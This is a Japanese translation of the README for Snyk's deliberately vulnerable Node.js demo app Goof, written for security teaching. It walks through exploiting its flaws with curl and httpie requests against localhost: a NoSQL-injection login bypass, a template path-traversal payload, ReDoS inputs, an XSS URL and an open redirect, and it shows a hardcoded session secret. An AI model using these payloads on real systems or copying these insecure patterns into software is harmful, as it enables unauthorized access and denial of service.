# Goof - Snykの脆弱なデモアプリ
[![Known Vulnerabilities](https://snyk.io/test/github/snyk/goof/badge.svg?style=flat-square)](https://snyk.io/test/github/snyk/goof)

これは、[Dreamers Labチュートリアル](http://dreamerslab.com/blog/en/write-a-todo-list-with-express-and-mongodb/)に基づく脆弱なNode.jsデモアプリケーションです。

## 特徴

この脆弱なアプリは、次の機能を含んでいます：

- 既知の脆弱性を持つ[パッケージ](#exploiting-the-vulnerabilities)の使用
- システムライブラリに既知の脆弱性があるベースイメージの[Dockerイメージスキャン](#docker-image-scanning)
- オープンソース依存関係で脆弱な関数の呼び出しを検出する[ランタイムアラート](#runtime-alerts)

## 実行方法

```bash
mongod &

npm install
npm start
```
これはGoofをローカルで実行し、デフォルトポートでローカルMongoDBを使用して、ポート3001（http://localhost:3001）でリッスンします。

注意: 一部の古いライブラリのデータベースサーバAPIのため、古いMongoDBバージョンを使用する必要があります。MongoDB 3は正常に動作することが確認されています。

また、以下のようにMongoDBサーバをDockerで個別に実行できます：

```sh
docker run --rm -p 27017:27017 mongo:3
```

## docker-composeでの実行
```bash
docker-compose up --build
docker-compose down
```

<!-- ### Heroku usage
Goof requires attaching a MongoLab service to be deployed as a Heroku app. 
That sets up the MONGOLAB_URI env var so everything after should just work. 

### CloudFoundry usage
Goof requires attaching a MongoLab service and naming it "goof-mongo" to be deployed on CloudFoundry. 
The code explicitly looks for credentials to that service.  -->

### クリーンアップ
DBから現在のTODOアイテムのリストを一括削除するには、以下を実行します：
```bash
npm run cleanup
```

## 脆弱性の悪用

このアプリは、既知の脆弱性を含むnpm依存関係と、コードレベルの脆弱性を引き起こす不安定なコードを使用しています。

`exploits/`ディレクトリには、各脆弱性を示す手順が含まれています。

### オープンソース依存関係の脆弱性

以下の脆弱なパッケージがあります：
- [Mongoose - バッファメモリ露出](https://snyk.io/vuln/npm:mongoose:20160116) - バージョン<=Node.js 8。デモ目的で、Dockerfileの`node`ベースイメージを`FROM node:6-stretch`に更新できます。
- [st - ディレクトリトラバーサル](https://snyk.io/vuln/npm:st:20140206)
- [ms - ReDoS](https://snyk.io/vuln/npm:ms:20151024)
- [marked - XSS](https://snyk.io/vuln/npm:marked:20150520)

### コード内の脆弱性

* オープンリダイレクト
* NoSQLインジェクション
* コードインジェクション
* コマンド実行
* クロスサイトスクリプティング（XSS）
* コード内のハードコードされた値による情報漏洩
* サーバ情報の露出によるセキュリティミスコンフィギュレーション
* 不安全なプロトコル（HTTP）通信

#### コードインジェクション

`/account_details`ページはHandlebarsビューとしてレンダリングされます。

このビューは、アカウント詳細を表示するGETリクエストと、アカウント詳細を更新するPOSTリクエストの両方で使用されます。いわゆるサーバーサイドレンダリングです。

フォームは完全に機能します。動作としては、`req.body`からプロファイル情報を受け取り、そのままテンプレートに渡します。これにより、攻撃者はリクエストから直接テンプレートライブラリに流れる変数を制御できることになります。

最悪の事態は起こらないと思うかもしれませんが、バリデーションが期待される入力を確認するために使われているにも関わらず、新たにオブジェクトに追加できるフィールド（例えば`layout`）を考慮していません。これをテンプレート言語に渡すと、ローカルファイルインクルージョン（パストラバーサル）脆弱性を引き起こす可能性があります。以下はその証明です：

```sh
curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"username": "admin@snyk.io", "password": "SuperSecretPassword"}' 'http://localhost:3001/login'
```

```sh
curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"email": "admin@snyk.io", "firstname": "admin", "lastname": "admin", "country": "IL", "phone": "+972551234123",  "layout": "./../package.json"}' 'http://localhost:3001/account_details'
```

実際、このコードにはもう一つ脆弱性があります。  
私たちが使用している`validator`ライブラリには、いくつかの既知の正規表現によるサービス拒否（DoS）脆弱性があります。その一つは、メールアドレスの正規表現に関連しており、`{allow_display_name: true}`オプションで検証すると、このルートでサービス拒否を引き起こす可能性があります：

```sh
curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"`seq -s "" -f "<" 100000`\"}" 'http://localhost:3001/account_details'
```

`validator.rtrim()` サニタイザーも脆弱で、これを利用して同様のサービス拒否攻撃を作成できます：

```sh
curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"someone@example.com\", \"country\": \"nop\", \"phone\": \"0501234123\", \"lastname\": \"nop\", \"firstname\": \"`node -e 'console.log(" ".repeat(100000) + "!")'`\"}" 'http://localhost:3001/account_details'
```

#### NoSQLインジェクション

`/login` へのPOSTリクエストは、システムに管理者ユーザーとして認証し、サインインすることを可能にします。これにより、`loginHandler`が`routes/index.js`のコントローラーとして公開され、MongoDBデータベースと`User.find()`クエリを使用してユーザーの詳細（メールアドレスとパスワード）を検索します。問題の一つは、パスワードが平文で保存され、ハッシュ化されていないことです。しかし、ここには他にも問題があります。

誤ったパスワードでリクエストを送信して、失敗する様子を確認できます。

```sh
echo '{"username":"admin@snyk.io", "password":"WrongPassword"}' | http --json $GOOF_HOST/login -v
```

そして、次のJSONリクエストを使って管理者ユーザーとしてサインインするリクエストは、期待通りに動作します。
```sh
echo '{"username":"admin@snyk.io", "password":"SuperSecretPassword"}' | http --json $GOOF_HOST/login -v
```

しかし、パスワードが文字列ではなくオブジェクトだった場合はどうでしょうか？オブジェクトが有害または問題として考えられる理由は何でしょうか？
次のリクエストを考えてみてください：
```sh
echo '{"username": "admin@snyk.io", "password": {"$gt": ""}}' | http --json $GOOF_HOST/login -v
```

私たちはユーザー名を知っており、何らかのオブジェクトのように見えるものを渡します。
そのオブジェクト構造はそのまま `password` プロパティに渡され、MongoDBに特定の意味を持ちます - それは `$gt` 演算子を使用して「空文字列より大きい」という意味になります。したがって、実際には、空文字列より大きいパスワードを持つレコードを照合するようMongoDBに指示しており、これがNoSQLインジェクションベクターを引き起こします。

#### オープンリダイレクト

`/admin` ビューは、管理ビュー内で次のように `redirectPage` クエリパスを導入します：

```
<input type="hidden" name="redirectPage" value="<%- redirectPage %>" />
```

ここでの問題は、`redirectPage` が生のHTMLとしてレンダリングされ、適切にエスケープされていないことです。なぜなら、`<%- >` が使用されており、`<%= >` ではないからです。このこと自体が、次のようにクロスサイトスクリプティング（XSS）脆弱性を引き起こします：

```
http://localhost:3001/login?redirectPage="><script>alert(1)</script>
```

オープンリダイレクトを悪用するには、`redirectPage=https://google.com` のようなURLを提供するだけで、コードが `index.js:72` でローカルURLを強制しない事実を利用します。

#### ハードコードされた値 - セッション情報

アプリケーションは、`app.js:40` で以下のようにクッキーをベースにしたセッションを初期化します：

```js
app.use(session({
  secret: 'keyboard cat',
  name: 'connect.sid',
  cookie: { secure: true }
}))
```

ご覧の通り、セッションの `secret` はコード内にハードコードされた機密情報です。

最初の修正案として、これを設定ファイルに移動する方法があります。例えば：
```js
module.exports = {
    cookieSecret: `keyboard cat`
}
```

その後、設定ファイルを読み込んでセッションの初期化時に使用します。
ただし、それでも秘密情報が別のファイル内に保持されており、Snyk Codeはその点を警告します。

セッション管理に関してもう1つ議論できる点は、`secure: true` でクッキーが設定されており、HTTPS接続でのみ送信されることですが、`httpOnly` フラグが `true` に設定されていないため、クッキーがJavaScriptからアクセス可能である点です。Snyk Codeはこの潜在的なセキュリティミス設定を強調表示します。この問題はセキュリティエラーとしてではなく、品質情報として表示されます。

Snyk Codeは、アプリケーションロジックに含まれないソースコード内のハードコードされた秘密情報も検出します。例えば、`tests/` や `examples/` フォルダ内にそのようなケースがあります。このアプリケーションでは `tests/authentication.component.spec.js` ファイルが該当します。この場合、Snyk Codeは `InTest`、`Tests`、または `Mock` とタグ付けされ、実際の情報漏洩ではないため、この検出を無視できます。

## Dockerイメージのスキャン

`Dockerfile` は、脆弱性を持つシステムライブラリを含む既知のベースイメージ（`node:6-stretch`）を使用しています。

イメージの脆弱性をスキャンするには、次のコマンドを実行します：
```bash
snyk test --docker node:6-stretch --file=Dockerfile
```

To monitor this image and receive alerts with Snyk:
```bash
snyk monitor --docker node:6-stretch
```

<!-- ## Runtime Alerts

Snyk provides the ability to monitor application runtime behavior and detect an invocation of a function is known to be vulnerable and used within open source dependencies that the application makes use of.

The agent is installed and initialized in [app.js](./app.js#L5).

For the agent to report back to your snyk account on the vulnerabilities it detected it needs to know which project on Snyk to associate with the monitoring. Due to that, we need to provide it with the project id through an environment variable `SNYK_PROJECT_ID`

To run the Node.js app with runtime monitoring:
```bash
SNYK_PROJECT_ID=<PROJECT_ID> npm start
```

** The app will continue to work normally even if it's not provided a project id

## Fixing the issues
To find these flaws in this application (and in your own apps), run:
```
npm install -g snyk
snyk wizard
```

In this application, the default `snyk wizard` answers will fix all the issues.
When the wizard is done, restart the application and run the exploits again to confirm they are fixed. -->
